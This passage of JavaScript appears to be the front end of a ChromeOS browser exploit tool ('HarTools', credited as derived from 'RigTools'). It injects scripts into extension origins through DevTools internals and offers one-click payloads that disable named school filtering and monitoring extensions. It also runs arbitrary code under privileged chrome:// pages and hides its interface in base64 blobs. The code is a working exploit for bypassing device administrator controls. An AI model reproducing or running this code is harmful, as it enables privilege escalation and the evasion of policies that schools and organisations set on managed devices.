B7fTsKICB9CiAgCiAgaWYgKGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQpIHsKICAgIGRvY3VtZW50LndyaXRlKG1hbmFnZW1lbnRUZW1wbGF0ZSk7CiAgICBjb25zdCBleHRDb250YWluZXJFbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLmV4dC1jb250YWluZXIiKTsKICAgIGF3YWl0IHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRDb250YWluZXJFbGVtZW50KTsKICAgIAogICAgY29uc3QgY29udGFpbmVyRXh0ZW5zaW9ucyA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0Iik7CiAgICAKICAgIGNvbnRhaW5lckV4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3RvZ2dsZXIiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZHgoZSkgewogICAgICBjb250YWluZXJFeHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikuZGlzYWJsZWQgPSB0cnVlOwogICAgICAKICAgICAgbGV0IGlkID0gY29udGFpbmVyRXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIuZXh0bnVtIikudmFsdWU7CiAgICAgIGNvbnRhaW5lckV4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiLmV4dG51bSIpLnZhbHVlID0gIiI7CgogICAgICB0cnkgewogICAgICAgIGlkID0gcGFyc2VJbnQoaWQpOwogICAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGlmICghc2F2ZWRFeHRMaXN0W2lkIC0gMV0pIHsKICAgICAgICBhbGVydCgiU2VsZWN0IGV4dGVuc2lvbiBmcm9tIGxpc3QhIik7CiAgICAgICAgY29udGFpbmVyRXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlciIpLmRpc2FibGVkID0gZmFsc2U7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBhd2FpdCBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSkgewogICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoc2F2ZWRFeHRMaXN0W2lkIC0gMV0uaWQsICFzYXZlZEV4dExpc3RbaWQgLSAxXS5lbmFibGVkLCByZXNvbHZlKTsKICAgICAgfSk7CgogICAgICBjb250YWluZXJFeHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikuZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgYXdhaXQgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dENvbnRhaW5lckVsZW1lbnQpOwogICAgfTsKCiAgICBjb250YWluZXJFeHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikuZGlzYWJsZWQgPSBmYWxzZTsKICB9CgogIG5ldyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzKCkuYWN0aXZhdGUoKTsKICBkb2N1bWVudC5jbG9zZSgpOwogIEV4dGVuc2lvbkNhcGFiaWxpdGllcy5zZXR1cFNsaWRlcygpOwp9Ow==`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsIC0gUmlndG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgoKICA8IS0tIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+IC0tPgo8L2JvZHk+Cgo8L2h0bWw+')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkhhclRvb2xzPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBpZnJhbWUgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgd2lkdGg6IDA7CiAgICAgICAgaGVpZ2h0OiAwOwogICAgICB9CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KCiAgICAgIGEgewogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMWQxZDFkOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIG1heC1oZWlnaHQ6IDkwdmg7CiAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsKICAgICAgICB3aWR0aDogNzUlOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiAzLjVlbTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgfQoKICAgICAgLnRpdGxlLXRleHQgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMi4yZW07CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBtYXJnaW46IDVweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICB9CgogICAgICAuYnV0dG9uOmZvY3VzIHsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICBpbnB1dCwKICAgICAgc2VsZWN0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzEyMTIxMjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICB9CgogICAgICBpbnB1dDpmb2N1cywKICAgICAgc2VsZWN0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICBib3JkZXItY29sb3I6ICNhODEyZmY7CiAgICAgIH0KCiAgICAgIDo6cGxhY2Vob2xkZXIgewogICAgICAgIGNvbG9yOiAjYmJiOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS10ZXh0Ij4KICAgICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPk9yaWdpbmFsIFJpZ1Rvb2xzIEV4cGxvaXQgd2FzIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT48L3A+CiAgICAgIDxocj4KICAgICAgPHA+QUtBOiBpZiBzb21lb25lIHRlbGxzIHlvdSB0aGF0IHRoZXkgbWFkZSB0aGlzLCB0aGV5J3JlIGx5aW5nIGFuZCB5b3Ugc2hvdWxkIGxhdWdoIGF0IHRoZW08L3A+CiAgICAgIDxocj4KICAgICAgPHA+QWRkaXRpb25hbCBjcmVkaXRzOiBEaXNjb3JkOiBAYXhxbXggKHRlc3RpbmcgYW5kIGhlbHBpbmcgd2l0aCBkZXZlbG9wbWVudCkgQHB3ZW4gKGlkZWFzKSB8IEdpdGh1YjogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiAob3JpZ2luYWwgcmlndG9vbHMgZXhwbG9pdCkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+ICh0ZXN0aW5nIGFuZCBkZXZlbG9wbWVudCk8L3A+CiAgICAgIDxocj4KCiAgICAgIDxwPlByZXNzIFEgZm9yIGV2YWx1YXRpbmcgY29kZSB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZXh0ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmV4dGVuc2lvbiBpZDwvYT48L3A+CiAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgPHA+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGFsZXJ0PC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdvZ3VhcmRpYW48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttZmZlaGJpZGxhbGliZmVrbGFlZm5ja3BpZGJvZGZmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmlib3NzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1sb2FqZm5tamNrZmpiZWVvZmNkYWVjYmVsbmJsZGVuIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnNuYXAmcmVhZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttcGpsaWxuZW1qY2lvaGpja2phZG1nbWljb2xkZ2xmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmR5a25vdyBjbG91ZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJnbmRtaGRjZWZiaGxjaGtoaXBjbm5ia2NtaWNuY2VoayIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nZm9ybXMgbG9ja2VkIG1vZGUgKGVucm9sbGVkIGNicyk8L2E+CiAgICAgIDwvcD4KCiAgICAgIDxwPlByZXNzIE0gZm9yIGV2YWx1YXRpbmcgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImRldmRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5kZXZ0b29sczwvYT4gY29udGV4dDwvcD4KICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJkZXZ0b29sczovL2RldnRvb2xzL2J1bmRsZWQvZGV2dG9vbHNfYXBwLmh0bWw/ZXhwZXJpbWVudHM9dHJ1ZSZ3cz0lJXVwZGF0ZXJ1cmwlJSI+UmUtb3BlbiBkZXZ0b29sczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idXBkYXRlciI+VXBkYXRlIHBheWxvYWQ8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlIj5DaHJvbWUgVVJMczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUyIj5DaHJvbWUgVVJMcyAyPC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gInEiKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXh0ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIm0iKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGV2ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICBjb25zb2xlLmxvZyhldmVudC5rZXkpOwogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgcCAuaGFyZGNvZGVkOm50aC1jaGlsZCgke3BhcnNlSW50KGV2ZW50LmtleSl9KWApLmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
